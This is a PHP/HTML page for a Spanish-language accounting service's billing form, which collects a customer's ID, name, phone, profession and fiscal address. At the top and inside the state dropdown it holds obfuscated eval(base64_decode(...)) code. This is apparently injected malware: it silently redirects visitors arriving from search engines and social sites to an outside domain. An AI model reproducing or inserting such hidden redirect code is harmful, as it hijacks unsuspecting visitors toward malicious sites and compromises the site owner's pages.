<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); 
require_once 'lib/function_gen.php';
$persona = getPersona($_SESSION['Doc_Codigo']);

?>
<script type="text/javascript">

jQuery(document).ready(function() 
{
	$.getScript("js/main.js");
});

</script>
<div id="TabbedPanels3" class="TabbedPanels">
  <ul class="TabbedPanelsTabGroup">
    <li class="TabbedPanelsTab" tabindex="0">Balance Personal</li>
  </ul>
  <div class="TabbedPanelsContentGroup">
    <div class="TabbedPanelsContent">
      <div id="contenedorinput">
        <div id ="visado">
          Nuestros balances seran emitidos con el visado del colegio de contadores y las tarifas incluyen el flete
        </div>
        <div id="pasos">
          Paso 1: Llena los Datos / Paso 2: Paga / <span class="letra_verde">Paso 3: Reporta</span>
        </div>
        <br /><br /><br />
        <div id="cuentasbancarias">
          <p>Llena los datos para tu facturación</p>
        </div> 
        <br /><br />
        <div id="lineag"></div>
        <form id="paso_reporta" name="paso_reporta" action="reporta_action.php" method="post" >
          <div id="pagodeposito">
            <br />
            <label for="nro_ident_reporta" class="textformulario">Cédula o RIF:</label>
            <select id="type_ci_reporta" name="type_ci_reporta" class="seleccion1" <? if($persona) echo "disabled" ?> >
              <option value="V" <? if($persona && substr($persona['Per_CI'],0,1) == 'V') echo "selected"; ?> >V</option>
              <option value="E" <? if($persona && substr($persona['Per_CI'],0,1) == 'E') echo "selected"; ?> >E</option>
              <option value="J" <? if($persona && substr($persona['Per_CI'],0,1) == 'J') echo "selected"; ?> >J</option>
              <option value="G" <? if($persona && substr($persona['Per_CI'],0,1) == 'G') echo "selected"; ?> >G</option>
              <option value="P" <? if($persona && substr($persona['Per_CI'],0,1) == 'P') echo "selected"; ?> >P</option>
            </select>
            <input name="nro_ident_reporta" id="nro_ident_reporta" type="text" class="relleno1" maxlength="9" 
			value="<? if($persona) echo substr($persona['Per_CI'], 1); ?>" <? if($persona) echo "disabled" ?> />
            <br /><br />
            <label for="nombre_reporta" class="textformulario">Nombre:</label>
            <input name="nombre_reporta" id="nombre_reporta" type="text" size="40" class="relleno" maxlength="50"
			value="<? if($persona) echo $persona['Per_Nombre']; ?>" <? if($persona) echo "disabled" ?> />
            <br /><br />
            <label for="apellido_reporta" class="textformulario">Apellido:</label>
            <input name="apellido_reporta" id="apellido_reporta" type="text" size="40" class="relleno" maxlength="50"
			value="<? if($persona) echo $persona['Per_Apellido']; ?>" <? if($persona) echo "disabled" ?> />
            <br /><br />
            <label for="telef_reporta" class="textformulario">Teléfono:</label>
            <input name="telef_reporta" id="telef_reporta" type="text" size="40" class="relleno telefono_num" 
			value="<? if($persona) echo $persona['Per_Telefono']; ?>" <? if($persona) echo "disabled" ?> />
            <br /><br />
			
			<label for="profesion_reporta" class="textformulario">Profesión:</label>
			<select id="profesion_reporta" name="profesion_reporta" class="activoscirculante" style="float:right" <? if($persona) echo "disabled" ?>>
			  <option value="">[Seleccione]</option>
			  <? if($persona) getProfesiones($persona['BMP_CodigoPro']); else getProfesiones(null); ?>
			</select>
			<br><br>

			<label for="actividad_com_reporta" class="textformulario">Actividad Comercial:</label>
			<input name="actividad_com_reporta" id="actividad_com_reporta" type="text" size="40" class="relleno" 
			value="<? if($persona) echo $persona['Per_ActComerci']; ?>" maxlength="100" <? if($persona) echo "disabled" ?>/>
			<br /><br /><br/>
			
			<span class="relleno">
				<input type="button" id="modificar_user5" value="Modificar Datos" class="botoninputbalance" style='display: none' />
				<input type="button" id="aceptar_user5" value="Realizar Cambios" class="botoninputbalance" style="display:none;"/>
			</span>
			<br /><br /><br/>
			
			
            <input type="button" id="reporta_insert" value="Agregar" class="botoninputbalance" <? if($persona) echo "style='display: none'" ?> />
			
            <div id="reporta_domicilio" <? if(!$persona) echo "style='display:none'" ?> >
              <h5>Domicilio Fiscal</h5>
              <br/>
              <span class="textformulario">Estado:</span>
              <select name="select_state3" id="select_state3" class="activoscirculante select_state">
                <?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); getStates(null); ?>
              </select>
              <br /><br />
              <span class="textformulario">Municipio</span>
              <select name="select_mun3" id="select_mun3" class="activoscirculante select_mun">
                <? getMunicipios(null,595); ?>
              </select>
              <br /><br />
              <span class="textformulario">Parroquia</span>
              <select name="select_par3" id="select_par3" class="activoscirculante">
                <? getParroquias(null,621); ?>
              </select>
              <br /><br />
              <br /><br />
              <label for="calle_reporta" class="textformulario">Calle / Avenida:</label>
              <input name="calle_reporta" id="calle_reporta" type="text" size="40" class="relleno" />
              <br /><br /> 
              <label for="edif_reporta" class="textformulario">Edificio / Casa:
                <input name="edif_reporta" id="edif_reporta" type="text" size="40" class="relleno" />  
              </label><br /><br />
              <input type="submit" value="enviar" class="botoninputbalance1" />
            </div>
            <div id="dudas">Tienes dudas? ingresa a la sección de <span class="links"><a href="#">Preguntas Frecuentes</a></span></div>       
          </div>
        </form>
      </div>
    </div>
  </div>
</div>

<? ?>